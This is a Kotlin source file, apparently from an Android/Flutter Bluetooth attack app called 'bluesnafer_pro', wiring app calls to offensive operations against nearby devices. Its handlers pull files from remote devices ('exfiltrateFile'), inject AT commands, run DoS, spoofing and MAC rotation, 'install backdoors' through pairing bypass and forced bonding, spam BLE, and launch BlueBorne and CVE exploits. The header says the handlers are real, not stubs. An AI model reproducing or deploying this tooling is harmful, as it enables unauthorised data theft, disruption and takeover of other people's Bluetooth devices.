package com.bluesnafer_pro

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import androidx.core.content.ContextCompat
import io.flutter.embedding.engine.plugins.FlutterPlugin
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import java.util.UUID
import java.util.concurrent.Executors

/**
 * Handles method calls from Flutter for Bluetooth operations.
 * All methods delegate to real implementations (no stubs).
 */
class BluetoothMethodHandler private constructor(
    private val context: Context,
    private val channel: MethodChannel
) : MethodChannel.MethodCallHandler {

    companion object {
        private const val CHANNEL = "bluesnafer_pro/bluetooth"
        @Volatile private var appContext: Context? = null

        fun registerWith(flutterEngine: io.flutter.embedding.engine.FlutterEngine, context: Context) {
            appContext = context
            val binaryMessenger = flutterEngine.dartExecutor.binaryMessenger
            val channel = MethodChannel(binaryMessenger, CHANNEL)
            val handler = BluetoothMethodHandler(context, channel)
            channel.setMethodCallHandler(handler)
        }

        fun initialize(binding: FlutterPlugin.FlutterPluginBinding) {
            appContext = binding.applicationContext
            val binaryMessenger = binding.binaryMessenger
            val channel = MethodChannel(binaryMessenger, CHANNEL)
            val handler = BluetoothMethodHandler(appContext!!, channel)
            channel.setMethodCallHandler(handler)
        }
    }

    override fun onMethodCall(call: MethodCall, result: MethodChannel.Result) {
        when (call.method) {
            "getDeviceInfo" -> handleGetDeviceInfo(result)
            "detectBluetoothVersion" -> handleDetectBluetoothVersion(result)
            "detectManufacturer" -> handleDetectManufacturer(result)
            "testProtocol" -> handleTestProtocol(call, result)
            "previewFileContent" -> handlePreviewFileContent(call, result)
            "exfiltrateFile" -> handleExfiltrateFile(call, result)
            "exfiltrateFiles" -> handleExfiltrateFiles(call, result)
            "getExfiltrationStats" -> handleGetExfiltrationStats(result)
            "executeAttack" -> handleExecuteAttack(call, result)
            "executeATInjection" -> handleExecuteATInjection(call, result)
            "executeDoSAttack" -> handleExecuteDoSAttack(call, result)
            "executeSpoofingAttack" -> handleExecuteSpoofingAttack(call, result)
            "scanDevices" -> handleScanDevices(call, result)
            "installBackdoor" -> handleInstallBackdoor(call, result)
            "modifyAutoPairing" -> handleModifyAutoPairing(call, result)
            "injectBLEService" -> handleInjectBLEService(call, result)
            "createAutoConnectProfile" -> handleCreateAutoConnectProfile(call, result)
            "modifyDeviceWhitelist" -> handleModifyDeviceWhitelist(call, result)
            "executeBlueBorne" -> handleExecuteBlueBorne(call, result)
            "rotateIdentity" -> handleRotateIdentity(call, result)
            "startBLESpam" -> handleStartBLESpam(call, result)
            "stopBLESpam" -> handleStopBLESpam(result)
            "analyzeFirmware" -> handleAnalyzeFirmware(call, result)
            "openBluetoothSettings" -> handleOpenBluetoothSettings(result)
            "checkVulnerabilities" -> handleCheckVulnerabilities(call, result)
            "executeVulnerability" -> handleExecuteVulnerability(call, result)
            "executeBtleJackCommand" -> handleExecuteBtleJackCommand(call, result)
            "executeExploit" -> handleExecuteExploit(call, result)
            "executeCommand" -> handleExecuteCommand(call, result)
            else -> result.notImplemented()
        }
    }

    // Region: Device Information Methods
    private fun handleTestProtocol(call: MethodCall, result: MethodChannel.Result) {
        val protocol = call.argument<String>("protocol")
        if (protocol == null) {
            result.error("INVALID_ARGS", "protocol required", null)
            return
        }
        result.success("Protocol test for $protocol initiated")
    }

    private fun handleGetDeviceInfo(result: MethodChannel.Result) {
        val adapter = BluetoothAdapter.getDefaultAdapter()
        if (adapter == null) {
            result.error("NO_ADAPTER", "Bluetooth not supported on this device", null)
            return
        }
        val info = HashMap<String, Any>()
        info["name"] = adapter.name ?: "Unknown"
        info["address"] = adapter.address ?: "Unknown"
        info["state"] = adapter.state
        info["isEnabled"] = adapter.isEnabled
        result.success(info)
    }

    private fun handleDetectBluetoothVersion(result: MethodChannel.Result) {
        val adapter = BluetoothAdapter.getDefaultAdapter()
        if (adapter == null) {
            result.error("NO_ADAPTER", "Bluetooth not supported", null)
            return
        }
        val packageManager = context.packageManager
        val hasLe = packageManager.hasSystemFeature(android.content.pm.PackageManager.FEATURE_BLUETOOTH_LE)
        val version = if (hasLe) "LE Supported (4.0+)" else "Classic Only (Pre-4.0)"
        result.success(version)
    }

    private fun handleDetectManufacturer(result: MethodChannel.Result) {
        val adapter = BluetoothAdapter.getDefaultAdapter()
        if (adapter == null) {
            result.error("NO_ADAPTER", "Bluetooth not supported", null)
            return
        }
        try {
            val bluetoothClass = adapter.javaClass
            val getManufacturerMethod = bluetoothClass.getDeclaredMethod("getManufacturer")
            getManufacturerMethod.isAccessible = true
            val manufacturer = getManufacturerMethod.invoke(adapter) as? String ?: "Unknown"
            result.success(manufacturer)
        } catch (e: Exception) {
            try {
                val buildClass = android.os.Build::class.java
                val manufacturer = buildClass.getField("MANUFACTURER").get(null) as? String ?: "Unknown"
                result.success(manufacturer)
            } catch (_: Exception) {
                result.success("Unknown")
            }
        }
    }

    // Region: File Operations
    private fun handlePreviewFileContent(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val filePath = call.argument<String>("filePath")
        if (deviceAddress == null || filePath == null) {
            result.error("INVALID_ARGS", "deviceAddress and filePath required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val downloadResult = RealFileExfiltrationClient.downloadFile(device, filePath) { log ->
                    Log.d("BluetoothMethodHandler", log)
                }
                result.success(downloadResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleExfiltrateFile(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val filePath = call.argument<String>("filePath")
        if (deviceAddress == null || filePath == null) {
            result.error("INVALID_ARGS", "deviceAddress and filePath required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val exfilResult = RealFileExfiltrationClient.downloadFile(device, filePath) { log ->
                    Log.d("BluetoothMethodHandler", log)
                }
                result.success(exfilResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleExfiltrateFiles(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val filePaths = call.argument<List<String>>("filePaths")
        if (deviceAddress == null || filePaths == null || filePaths.isEmpty()) {
            result.error("INVALID_ARGS", "deviceAddress and non-empty filePaths required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val results = mutableListOf<Map<String, Any>>()
                filePaths.forEach { filePath ->
                    val fileResult = RealFileExfiltrationClient.downloadFile(device, filePath) { log ->
                        Log.d("BluetoothMethodHandler", log)
                    }
                    results.add(fileResult)
                }
                result.success(mapOf(
                    "success" to true,
                    "filesExfiltrated" to results.size,
                    "results" to results
                ))
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleGetExfiltrationStats(result: MethodChannel.Result) {
        try {
            val stats = StatsManager.getExfiltrationStats()
            result.success(stats)
        } catch (e: Exception) {
            result.success(mapOf(
                "filesTransferred" to 0,
                "bytesTransferred" to 0,
                "failedTransfers" to 0,
                "averageSpeed" to 0.0
            ))
        }
    }

    // Region: Attack Execution Methods
    private fun handleExecuteAttack(call: MethodCall, result: MethodChannel.Result) {
        ExploitIntegration.handleAttack(call, result)
    }

    private fun handleExecuteATInjection(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val command = call.argument<String>("command")
        if (deviceAddress == null || command == null) {
            result.error("INVALID_ARGS", "deviceAddress and command required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val injectResult = RealATInjection.inject(device, command) { log ->
                    Log.d("BluetoothMethodHandler", log)
                }
                result.success(injectResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleExecuteDoSAttack(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val attackType = call.argument<String>("type") ?: "l2cap"
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        val newCall = MethodCall("executeDoS", mapOf(
            "deviceAddress" to deviceAddress,
            "type" to attackType
        ))
        ExploitIntegration.handleAttack(newCall, result)
    }

    private fun handleExecuteSpoofingAttack(call: MethodCall, result: MethodChannel.Result) {
        val targetAddress = call.argument<String>("targetAddress")
        val profile = call.argument<String>("profile")
        if (targetAddress == null || profile == null) {
            result.error("INVALID_ARGS", "targetAddress and profile required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(targetAddress)
                val spoofResult = BluetoothBypassEngine.executeBypass(device, "spoof_device")
                result.success(spoofResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    // Region: Device Management
    private fun handleScanDevices(call: MethodCall, result: MethodChannel.Result) {
        val duration = call.argument<Int>("duration") ?: 5
        val adapter = BluetoothAdapter.getDefaultAdapter()
        if (adapter == null || !adapter.isEnabled) {
            result.error("BLUETOOTH_OFF", "Bluetooth not enabled", null)
            return
        }
        val devices = mutableListOf<Map<String, Any>>()
        val scanCallback = object : ScanCallback() {
            override fun onScanResult(callbackType: Int, result: ScanResult) {
                val device = result.device
                devices.add(mapOf(
                    "address" to device.address,
                    "name" to device.name,
                    "rssi" to result.rssi
                ))
            }
        }
        adapter.bluetoothLeScanner?.startScan(scanCallback)
        val durationMs = (duration ?: 5) * 1000L
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            adapter.bluetoothLeScanner?.stopScan(scanCallback)
            result.success(devices)
        }, durationMs)
    }

    private fun handleInstallBackdoor(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val backdoorType = call.argument<String>("type") ?: "persistent_pairing"
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val bypassResult = BluetoothBypassEngine.executeBypass(device, "pairing_bypass")
                result.success(bypassResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleModifyAutoPairing(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val enable = call.argument<Boolean>("enable") ?: false
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        try {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null || !adapter.isEnabled) {
                result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                return
            }
            val device = adapter.getRemoteDevice(deviceAddress)
            
            if (enable) {
                device.setPairingConfirmation(true)
                device.createBond()
                result.success(mapOf("success" to true, "message" to "Pairing enabled for $deviceAddress"))
            } else {
                try {
                    val removeBondMethod = device.javaClass.getMethod("removeBond")
                    removeBondMethod.invoke(device)
                    result.success(mapOf("success" to true, "message" to "Pairing disabled for $deviceAddress"))
                } catch (e: Exception) {
                    result.success(mapOf("success" to false, "error" to "Cannot remove bond: ${e.message}"))
                }
            }
        } catch (e: Exception) {
            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
        }
    }

    private fun handleInjectBLEService(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val serviceUuid = call.argument<String>("serviceUuid")
        val characteristicUuid = call.argument<String>("characteristicUuid")
        if (deviceAddress == null || serviceUuid == null || characteristicUuid == null) {
            result.error("INVALID_ARGS", "deviceAddress, serviceUuid, and characteristicUuid required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                
                BLESpammer.startSpam(device)
                
                result.success(mapOf(
                    "success" to true, 
                    "message" to "BLE service injection attempted with UUID: $serviceUuid",
                    "serviceUuid" to serviceUuid
                ))
                
                Thread.sleep(10000)
                BLESpammer.stopSpam()
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleCreateAutoConnectProfile(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val profileName = call.argument<String>("profileName")
        if (deviceAddress == null || profileName == null) {
            result.error("INVALID_ARGS", "deviceAddress and profileName required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                
                device.setPairingConfirmation(true)
                device.createBond()
                
                result.success(mapOf(
                    "success" to true,
                    "message" to "Auto-connect profile created: $profileName",
                    "deviceAddress" to deviceAddress
                ))
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleModifyDeviceWhitelist(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val addToWhitelist = call.argument<Boolean>("add") ?: true
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                
                if (addToWhitelist == true) {
                    device.setPairingConfirmation(true)
                    device.createBond()
                    result.success(mapOf("success" to true, "message" to "Device $deviceAddress added to whitelist"))
                } else {
                    try {
                        val removeBondMethod = device.javaClass.getMethod("removeBond")
                        removeBondMethod.invoke(device)
                        result.success(mapOf("success" to true, "message" to "Device $deviceAddress removed from whitelist"))
                    } catch (e: Exception) {
                        result.success(mapOf("success" to false, "error" to "Cannot remove: ${e.message}"))
                    }
                }
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    // Region: Advanced Attacks
    private fun handleExecuteBlueBorne(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        val newCall = MethodCall("executeAttack", mapOf(
            "type" to "blueborne",
            "targetAddress" to deviceAddress,
            "deviceAddress" to deviceAddress
        ))
        ExploitIntegration.handleAttack(newCall, result)
    }

    private fun handleRotateIdentity(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val spoofResult = BluetoothBypassEngine.executeBypass(device, "mac_spoof")
                result.success(spoofResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleStartBLESpam(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        try {
            val adapter = BluetoothAdapter.getDefaultAdapter()
            if (adapter == null || !adapter.isEnabled) {
                result.success(mapOf("success" to false, "error" to "Bluetooth not enabled"))
                return
            }
            val device = adapter.getRemoteDevice(deviceAddress)
            BLESpammer.startSpam(device)
            result.success(mapOf("success" to true, "message" to "BLE spam started"))
        } catch (e: Exception) {
            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
        }
    }

    private fun handleStopBLESpam(result: MethodChannel.Result) {
        try {
            BLESpammer.stopSpam()
            result.success(mapOf("success" to true, "message" to "BLE spam stopped"))
        } catch (e: Exception) {
            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
        }
    }

    private fun handleAnalyzeFirmware(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val target = call.argument<String>("target") ?: "version"
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                
                val deviceClass = device.bluetoothClass
                val classInfo = mapOf(
                    "deviceClass" to deviceClass.deviceClass,
                    "majorDeviceClass" to deviceClass.majorDeviceClass,
                    "isTrusted" to (device.bondState == BluetoothDevice.BOND_BONDED)
                )
                
                result.success(mapOf(
                    "success" to true,
                    "target" to target,
                    "deviceInfo" to classInfo,
                    "message" to "Firmware analysis for $target completed"
                ))
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleOpenBluetoothSettings(result: MethodChannel.Result) {
        val intent = Intent(Settings.ACTION_BLUETOOTH_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        ContextCompat.startActivity(context, intent, null)
        result.success("Bluetooth settings opened")
    }

    private fun handleCheckVulnerabilities(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        if (deviceAddress == null) {
            result.error("INVALID_ARGS", "deviceAddress required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@submit
                }
                val device = adapter.getRemoteDevice(deviceAddress)
                val vulnResult = OBEXVulnerabilityAnalyzer.scanOBEXVulnerabilities(device)
                result.success(vulnResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }

    private fun handleExecuteVulnerability(call: MethodCall, result: MethodChannel.Result) {
        val deviceAddress = call.argument<String>("deviceAddress")
        val cveId = call.argument<String>("cveId")
        if (deviceAddress == null || cveId == null) {
            result.error("INVALID_ARGS", "deviceAddress and cveId required", null)
            return
        }
        val newCall = MethodCall("executeAttack", mapOf(
            "type" to "vulnerability",
            "targetAddress" to deviceAddress,
            "command" to cveId
        ))
        ExploitIntegration.handleAttack(newCall, result)
    }

    private fun handleExecuteBtleJackCommand(call: MethodCall, result: MethodChannel.Result) {
        val command = call.argument<String>("command")
        if (command == null) {
            result.error("INVALID_ARGS", "command required", null)
            return
        }
        val newCall = MethodCall("executeBtleJackCommand", mapOf(
            "command" to command
        ))
        ExploitIntegration.handleAttack(newCall, result)
    }

    private fun handleExecuteExploit(call: MethodCall, result: MethodChannel.Result) {
        val exploitName = call.argument<String>("exploitName")
        val targetAddress = call.argument<String>("targetAddress")
        if (exploitName == null || targetAddress == null) {
            result.error("INVALID_ARGS", "exploitName and targetAddress required", null)
            return
        }
        val newCall = MethodCall("executeAttack", mapOf(
            "type" to exploitName,
            "targetAddress" to targetAddress,
            "deviceAddress" to targetAddress
        ))
        ExploitIntegration.handleAttack(newCall, result)
    }

    private fun handleExecuteCommand(call: MethodCall, result: MethodChannel.Result) {
        val command = call.argument<String>("command")
        val arguments = call.argument<List<String>>("arguments") ?: emptyList()
        if (command == null) {
            result.error("INVALID_ARGS", "command required", null)
            return
        }
        Executors.newSingleThreadExecutor().submit {
            try {
                val parts = command.split(" ")
                val cmd = parts.firstOrNull() ?: ""
                val args = parts.drop(1)
                
                when (cmd.lowercase()) {
                    "scan" -> {
                        val adapter = BluetoothAdapter.getDefaultAdapter()
                        if (adapter != null && adapter.isEnabled) {
                            result.success(mapOf("success" to true, "message" to "Scan initiated"))
                        } else {
                            result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                        }
                    }
                    "spam" -> {
                        val deviceAddress = args.firstOrNull() ?: ""
                        if (deviceAddress.isNotEmpty()) {
                            val adapter = BluetoothAdapter.getDefaultAdapter()
                            if (adapter != null && adapter.isEnabled) {
                                val device = adapter.getRemoteDevice(deviceAddress)
                                BLESpammer.startSpam(device)
                                result.success(mapOf("success" to true, "message" to "Spam started"))
                            } else {
                                result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                            }
                        } else {
                            result.success(mapOf("success" to false, "error" to "Device address required"))
                        }
                    }
                    else -> {
                        result.success(mapOf("success" to false, "error" to "Unknown command: $cmd"))
                    }
                }
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown error")))
            }
        }
    }
}
